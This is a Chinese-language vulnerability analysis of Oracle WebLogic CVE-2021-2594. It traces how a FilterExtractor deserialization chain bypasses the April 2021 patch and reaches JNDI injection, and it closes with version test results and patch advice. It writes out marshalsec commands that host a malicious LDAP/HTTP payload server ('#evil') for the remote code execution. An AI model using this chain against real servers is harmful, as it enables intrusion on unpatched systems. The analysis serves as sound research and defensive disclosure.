<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<p>作者：白帽汇安全研究院@kejaly</p>
<p>校对：白帽汇安全研究院@r4v3zn</p>
<h1 data-content="1" id="8c97dac46936c7a611f4692d9b5525bd">前言</h1>
<p>在2021年7月21日，Oracle官方 发布了一系列安全更新。涉及旗下产品（Weblogic Server、Database Server、Java SE、MySQL等）的 342 个漏洞，<a href="https://www.oracle.com/security-alerts/cpujul2021.htm。其中，Oracle" target="_blank">https://www.oracle.com/security-alerts/cpujul2021.htm。其中，Oracle</a> WebLogic Server 产品中有高危漏洞，漏洞编号为 CVE-2021-2594，CVSS 评分9.8分，影响多个 WebLogic 版本，且漏洞利用难度低，可基于 T3 和 IIOP 协议执行远程代码。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210813171403-cd6c0f20-fc16-1.png"/></p>
<p>经过分析，此次漏洞结合了 CVE-2020-14756 和 CVE-2020-14825 反序列化链，利用<code>FilterExtractor</code> 这个类来对4月份补丁进行绕过。</p>
<h1 data-content="1" id="1ced0ceab48cf42a676160c834083b60">补丁回顾</h1>
<p>在4月份补丁中，对 <code>ExternalizableHelper</code> 中的 <code>readExternalizable</code> 做了修改，增加了对传入的 <code>DataInput</code> 判断，如果是 <code>ObjectInputStream</code> 类型就会调用 <code>checkObjectInputFilter</code> 函数进行过滤。所以再利用 CVE-2020-14756  中直接反序列化 <code>com.tangosol.coherence.rest.util.extractor.MvelExtractor</code> 来造成 RCE 的方法已经行不通了。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210813171413-d37e45f4-fc16-1.png"/></p>
<h1 data-content="1" id="3544e32ceef81a0778966245d660f99b">调试环境</h1>
<p><strong>本文基于 win7 虚拟机 + Weblogic 12.1.4 版本 + jdk 8u181 进行研究分析测试</strong></p>
<p>修改目录 <code>user_project/domains/base_domain/bin</code> 目录中 <code>setDomainEnv.cmd</code> ，加<code>if %debugFlag == "true"%</code> 之前加入 <code>set debugFlag=true</code>。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210813171421-d856689a-fc16-1.png"/></p>
<p>拷贝 <code>Oracle_Home</code> 目录下所有文件至调试目录，将 <code>\coherence\lib</code>，<code>\oracle_common\modules</code>  目录下所有文件添加到 Libraries：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210813171427-dbeb70cc-fc16-1.png"/></p>
<p>配置 idea 中 jdk 版本与虚拟机中运行的 weblogic jdk 版本保持一致。</p>
<p>添加 remote 调试：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210813171433-dfb93194-fc16-1.png"/></p>
<h1 data-content="1" id="7f42c009efd967ad79e685eefce65e33">漏洞利用</h1>
<p>该漏洞主要是因为 <code>FilterExtractor</code> 的 <code>readExternal</code> 方法中会直接 <code>new</code> 一个 <code>MethodAttributeAccessor</code> 对象，使得生成 <code>MethodAttributeAccessor</code>的时候不会受到黑名单的限制，来对4月份的补丁进行绕过。</p>
<p><code>FilterExtractor</code>  类具有如下特征：</p>
<p>1.<code>FilterExtractor</code>  实现了 <code>ExternalizableLite</code> 接口，重写了 <code>readExternal</code> 方法：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210813171440-e3af0a94-fc16-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210813171444-e6176fd8-fc16-1.png"/></p>
<p><code>readExternal</code> 会调用<code>oracle.eclipselink.coherence.integrated.internal.cache.SerializationHelper#readAttributeAccessor</code> 方法:</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210813171451-ea0b17b6-fc16-1.png"/></p>
<p>可以看到会 <code>new</code> 一个 <code>MethodAttributeAccessor</code> 对象，然后根据 <code>DataInput</code> 赋值它的 <code>setAttributeName</code>，<code>setGetMethodName</code> 以及 <code>setSetMethodName</code> 属性（这就导致这三个属性是可控的）。</p>
<p>2.<code>FilterExtractor</code>  的 <code>extract</code> 方法中存在 <code>this.attributeAccessor.getAttributeValueFromObject()</code> 的调用。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210813171458-ee4bb150-fc16-1.png"/></p>
<p>熟悉 coherence 组件的漏洞的朋友应该知道在 CVE-2020-14825 中，就是利用 <code>MethodAttributeAccessor.getAttributeValueFromObject()</code> 来实现任意无参方法的调用的。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210813171509-f4f40976-fc16-1.png"/></p>
<p>虽然 <code>MethodAttributeAccessor</code>  已经加入到了黑名单，但是在上面提到的 <code>readExternal</code>  方法中恰好直接 <code>new</code> 了一个 <code>MethodAttributeAccessor</code> 对象，也就是说不是通过反序列化得到 <code>MethodAttributeAccessor</code> 对象，自然也就不受黑名单的影响。</p>
<h2 data-content="1" id="279c5694f2e73c86c55cc36eff0ce2e7">调用链</h2>
<p>完整调用链如下：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210813171517-f9957ca8-fc16-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210813171521-fc4218d0-fc16-1.png"/></p>
<h2 data-content="1" id="63afe450e2810d74fd81af3ee75170b1">漏洞分析</h2>
<p>根据构造的 poc ，我们首先在 <code>AttributeHolder</code> 类的 <code>readExternal</code>方法中打上断点，另一边则运行我们的 poc ，成功断下：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210813171527-ffaaec68-fc16-1.png"/></p>
<p>步入，会调用到 <code>com.tangosol.util.ExternalizableHelper</code> 中的 <code>readObject</code> 方法：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210813171533-035c1ce2-fc17-1.png"/></p>
<p>步入，最后会进入到 <code>com.tangosol.util.ExternalizableHelper</code>中的 <code>readObjectInternal</code>  方法中调用 <code>readExternalizableLite</code> 方法：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210813171540-074685b8-fc17-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210813171544-09b62c90-fc17-1.png"/></p>
<p>步入，在<code>com.tangosol.util.ExternalizableHelper#readExternalizableLite</code> 方法中，首先会调用 <code>loadClass</code> 去加载类，然后调用无参构造函数实例化一个对象，这里个加载的类是 <code>com.tangosol.util.aggregator.TopNAggregator$PartialResult</code>：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210813171551-0e556cfc-fc17-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210813171556-10c390d6-fc17-1.png"/></p>
<p>随后会调用 <code>com.tangosol.util.aggregator.TopNAggregator$PartialResult</code> 类的 readExternal 方法：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210813171602-14d68e44-fc17-1.png"/></p>
<p>步入，会再次调用 <code>com.tangosol.util.ExternalizableHelper.readObject</code> 方法来读取一个对象并且赋值到 <code>this.m_comparator</code> 中，</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210813171611-1a27956e-fc17-1.png"/></p>
<p>步入，之后会再次调用到 <code>com.tangosol.util.ExternalizableHelper#readExternalizableLite</code>  方法，由于这次读取的 <code>sClass</code> 是 <code>oracle.eclipselink.coherence.integrated.internal.querying.FilterExtractor</code> ，所以会实例化一个 <code>FilterExtractor</code> 对象，然后调用它的 <code>readExternal</code> 方法：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210813171621-1fd77e66-fc17-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210813171625-2246d368-fc17-1.png"/></p>
<p>步入 ，来到 <code>FilterExtractor</code> 的 <code>readExteral</code> 中，会调用 <code>oracle.eclipselink.coherence.integrated.internal.cache.SerializationHelper#readAttributeAccessor</code> 方法：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210813171632-265cbc42-fc17-1.png"/></p>
<p>步入，会 <code>new</code> 一个 <code>MethodAttributeAccessor</code> 对象，并且调用 <code>com.tangosol.util.SerializationHelper#readObject</code> 方法给 <code>MethodAttributeAccessor</code> 对象的 <code>attributeName</code> , <code>getMethodName</code> 和 <code>setMethodName</code> 这三个属性赋值：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210813171636-29158176-fc17-1.png"/></p>
<p>赋值之后的结果为：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210813171642-2c67ca32-fc17-1.png"/></p>
<p>再回到之前的 <code>com.tangosol.util.aggregator.TopNAggregator$PartialResult</code> 类的 readExternal 方法中，<code>this.m_comparator</code> 变成了上面 <code>oracle.eclipselink.coherence.integrated.internal.querying.FilterExtractor</code> 对象：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210813171649-30a3aaf8-fc17-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210813171653-32fb6098-fc17-1.png"/></p>
<p>接着在 182 行，会调用 <code>this.instantiateInternalMap(this.m_comparator)</code> 方法，步入，会把 <code>FilterExtractor</code>再封装到 <code>WrapperCompator</code> 中，然后传入 <code>TreeMap</code>的构造函数，实例化一个 <code>TreeMap</code> 对象并且返回：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210813171700-370660fc-fc17-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210813171706-3af34306-fc17-1.png"/></p>
<p>186 行，调用 <code>this.add</code> 方法，这里 <code>ExternalizableHelper.readObject(in)</code>返回的是 <code>JdbcRowSetImpl</code> 对象</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210813171713-3ef3df56-fc17-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210813171717-4105b08a-fc17-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210813171720-434ee2e4-fc17-1.png"/></p>
<p>接着步入 <code>super.add</code> 方法：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210813171727-471dbb5c-fc17-1.png"/></p>
<p>然后会调用 <code>TreeMap.put</code> 方法，添加传入的 <code>JdbcRowSetImpl</code> 对象，最后会来到 <code>com.tangosol.util.WrapperComparator#compare</code> 方法并触发 <code>this.f_comparator.compare</code> 方法， <code>this.f_comparator</code> 正是之前传入的 <code>FilterExtractor</code> 对象：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210813171732-4a43ac2e-fc17-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210813171736-4c8dae1c-fc17-1.png"/></p>
<p>步入，会调用 <code>com.tangosol.util.extractor#compare</code> 方法，这个方法中又会调用到 <code>this.extract</code> 方法，也就是会调用 <code>FilterExtractor#extract</code>方法，进而调用 <code>this.attributeAccessor</code> 的 <code>initializeAttributes</code> 方法, 而此时的 <code>this.attributeAccssor</code> 是 <code>MethodAttributeAccessor</code> 对象，所以会调用 <code>MethodAttributeAccessor#initializeAttributes</code> 方法：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210813171742-507a7c6c-fc17-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210813171746-52803f74-fc17-1.png"/></p>
<p>在 <code>MethodAttributeAccessor</code> 中的 <code>initializeAttributes</code> 方法中首先会调用 <code>this.setGetMethod</code>  方法来设置 <code>MethodAttributeAccessor</code> 的 <code>getMethod</code> ：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210813171752-5637a576-fc17-1.png"/></p>
<p>其中 <code>Helper.getDeclaredMethod</code> 方法流程如下，是通过传入的类，方法名，以及参数类型来得到对应 <code>class</code> 的 <code>Method</code>：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210813171831-6d2760a0-fc17-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210813171834-6f2a4886-fc17-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210813171838-71b79f72-fc17-1.png"/></p>
<p>此时由于 <code>theJavaClass</code> 是 <code>com.sun.rowset.JdbcRowSetImpl</code>,  <code>this.getMethodName</code> 是 <code>"prepare"</code> ，所以第一次得到的 <code>prepare</code> 方法：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210813171845-758189d8-fc17-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210813171849-782903c8-fc17-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210813171853-7a6d19b2-fc17-1.png"/></p>
<p>与 CVE-2020-14825 的反序列化流程不同的是， 因为在 <code>initializeAttributes</code> 的时候，我们不能再通过控制 <code>isWriteOnly</code> 属性为 <code>true</code> ，所以会进入到下面这个 if 分支里面去：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210813172517-5f6a794c-fc18-1.png"/></p>
<p>会先调用 <code>this.getSetMethodParameterTypes</code> 得到 <code>this.getGetMethod</code> 属性代表的方法的返回值：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210813172510-5b080e14-fc18-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210813172505-584d3514-fc18-1.png"/></p>
<p><code>this.getGetMethod</code> 在上一步赋值为了 <code>protected java.sql.PreparedStatement com.sun.rowset.JdbcRowSetImpl.prepare() throws java.sql.SQLException</code> ，</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210813171922-8c16be2a-fc17-1.png"/></p>
<p>所以这里 <code>this.getSetMethodParameterTypes</code> 方法得到的是 <code>java.sql.PreparedStatement</code>类型:</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210813171935-9345c0ce-fc17-1.png"/></p>
<p>然后调用<code>Helper.getDeclaredMethod(theJavaClass, this.getSetMethodName(), this.getSetMethodParameterTypes());</code> 就会得到 <code>protected java.sql.PreparedStatement com.sun.rowset.JdbcRowSetImpl.prepare() throws java.sql.SQLException</code> 方法。</p>
<p><code>initializeAttributes</code> 结束后 <code>MethodAttributeAccessor</code>的属性值：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210813171946-9a2e8236-fc17-1.png"/></p>
<p>接着，回到 <code>FilterExtractor#extract</code> 方法中，会继续调用 <code>this.attributeAccessor.getAttributeValueFromObject</code> 也就是调用 <code>MethodAttributeAccessor.getAttributeValueFromObject</code> 方法：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210813171953-9e50fe5c-fc17-1.png"/></p>
<p>步入：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210813171959-a1cbb64e-fc17-1.png"/></p>
<p>步入，会利用反射调用方法：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210813172004-a4f1cee4-fc17-1.png"/></p>
<p>此时 <code>this.getMethod</code> 是 <code>protected java.sql.PreparedStatement com.sun.rowset.JdbcRowSetImpl.prepare() throws java.sql.SQLException</code>，<code>abObject</code> 是 <code>JbbcRoeSetImpl</code> ：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210813172010-a892d4f8-fc17-1.png"/></p>
<p>这就导致了 jndi 注入的产生：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210813172017-ac62be0e-fc17-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210813172021-aec05cec-fc17-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210813172024-b0adcc9c-fc17-1.png"/></p>
<p>我们在本地使用 marshalsec 搭建恶意 jndi 服务端：</p>
<div class="highlight"><pre><span></span>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://192.168.1.1:8000/#evil <span class="m">1389</span>
python -m http.server
</pre></div>
<p>成功 RCE：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210813172031-b4c943f6-fc17-1.png"/></p>
<h2 data-content="1" id="a4cd1a4ebfe9ae488222ed3b5f4a3d82">jndi 版本问题</h2>
<p>在Oracle JDK 11.0.1、8u191、7u201、6u211之后 com.sun.jndi.ldap.object.trustURLCodebase 属性的默认值被设置为false，所以此 ldap + jndi 导致 RCE 的方法失效。</p>
<h2 data-content="1" id="c565c2b07788e7ed7be0426240e35bc2">10.3.6.0 问题</h2>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210813172113-ce2dc254-fc17-1.png"/></p>
<p>在使用基于 <code>TopNAggregator.PartialResult</code> 的 poc 对官网说的版本进行复现的时候，发现 10.3.6.0.0  版本中并不存在 <code>com.tangosol.util.SortedBag</code> 和 <code>com.tangosol.util.aggregator.TopNAggregator</code> 这两个类：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210813172121-d2ea364c-fc17-1.png"/></p>
<p>缺少 <code>SortedBag</code>：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210813172129-d7491546-fc17-1.png"/></p>
<p>缺少 <code>TopNAggregator</code> ：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210813172135-daffc7f2-fc17-1.png"/></p>
<h2 data-content="1" id="8dcb0b942574b5adf2f5dc5284b2121e">weblogic 版本问题</h2>
<p>使用不同 weblogic 版本的 jar 包对不同版本的 weblogic 进行测试，经过测试研究发现以下情况：</p>
<table>
<thead>
<tr>
<th style="">jar 版本</th>
<th style="">weblogic 版本</th>
<th style="">成功情况</th>
</tr>
</thead>
<tbody>
<tr>
<td style="">12.1.3.0.0</td>
<td style="">12.1.3.0.0</td>
<td style="">成功</td>
</tr>
<tr>
<td style="">12.1.3.0.0</td>
<td style="">12.2.1.3.0</td>
<td style="">失败</td>
</tr>
<tr>
<td style="">12.1.3.0.0</td>
<td style="">12.2.1.4.0</td>
<td style="">失败</td>
</tr>
<tr>
<td style="">12.1.3.0.0</td>
<td style="">14.1.1.0.0</td>
<td style="">失败</td>
</tr>
<tr>
<td style="">12.2.1.3.0</td>
<td style="">12.1.3.0.0</td>
<td style="">失败</td>
</tr>
<tr>
<td style="">12.2.1.3.0</td>
<td style="">12.2.1.3.0</td>
<td style="">成功</td>
</tr>
<tr>
<td style="">12.2.1.3.0</td>
<td style="">12.2.1.4.0</td>
<td style="">成功</td>
</tr>
<tr>
<td style="">12.2.1.3.0</td>
<td style="">14.1.1.0.0</td>
<td style="">成功</td>
</tr>
<tr>
<td style="">12.2.1.4.0</td>
<td style="">12.1.3.0.0</td>
<td style="">失败</td>
</tr>
<tr>
<td style="">12.2.1.4.0</td>
<td style="">12.2.1.3.0</td>
<td style="">成功</td>
</tr>
<tr>
<td style="">12.2.1.4.0</td>
<td style="">12.2.1.4.0</td>
<td style="">成功</td>
</tr>
<tr>
<td style="">12.2.1.4.0</td>
<td style="">14.1.1.0.0</td>
<td style="">成功</td>
</tr>
<tr>
<td style="">14.1.1.0.0</td>
<td style="">12.1.3.0.0</td>
<td style="">失败</td>
</tr>
<tr>
<td style="">14.1.1.0.0</td>
<td style="">12.2.1.3.0</td>
<td style="">成功</td>
</tr>
<tr>
<td style="">14.1.1.0.0</td>
<td style="">12.2.1.4.0</td>
<td style="">成功</td>
</tr>
<tr>
<td style="">14.1.1.0.0</td>
<td style="">14.1.1.0.0</td>
<td style="">成功</td>
</tr>
</tbody>
</table>
<h1 data-content="1" id="18f7f0100c0cb59cdd6d4fd745f36f8c">7月份补丁影响</h1>
<p>打了7月份补丁之后，会报错：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210813172144-e0b89fa2-fc17-1.png"/></p>
<p>原因是在 <code>WebLogicFilterConfig</code> 类的<code>DEFAULT_BLACKLIST_PACKAGES</code> 字段中新增了 <code>oracle.eclipselink.coherence.integrated.internal.querying</code> 这个包：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210813172153-e58f51c4-fc17-1.png"/></p>
<p>而 <code>FilterExtractor</code> 类正好在 <code>oracle.eclipselink.coherence.integrated.internal.querying</code> 包下面，所以导致被黑名单拦截了下来。</p>
<h1 data-content="1" id="2dc47b984d3778cf4c8ef7c59abee8d0">修复建议</h1>
<h2 data-content="1" id="f78ad497dae7d74080f9db55bdbd1730">通用修补建议</h2>
<p>Oracle官方已经发布补丁，及时进行更新：<a href="https://www.oracle.com/security-alerts/cpujul2021.html" target="_blank">https://www.oracle.com/security-alerts/cpujul2021.html</a></p>
<h2 data-content="1" id="aa1f01073d97fbe6acf2b275d6378a62">Weblogic 临时修补建议</h2>
<ol>
<li>如果不依赖 T3协议进行 JVM通信，可禁用 T3协议。</li>
<li>如果不依赖 IIOP协议进行 JVM通信，可禁用 IIOP协议。</li>
</ol>
<h1 data-content="1" id="39d6e4c88f2756294e6b7101414d5715">参考</h1>
<p><a href="https://www.cnblogs.com/potatsoSec/p/15062094.html" target="_blank">https://www.cnblogs.com/potatsoSec/p/15062094.html</a></p>
<p><a href="https://mp.weixin.qq.com/s/LbMB-2Qyrh3Lrqc_vsKIdA" target="_blank">https://mp.weixin.qq.com/s/LbMB-2Qyrh3Lrqc_vsKIdA</a></p>
</div>
</div>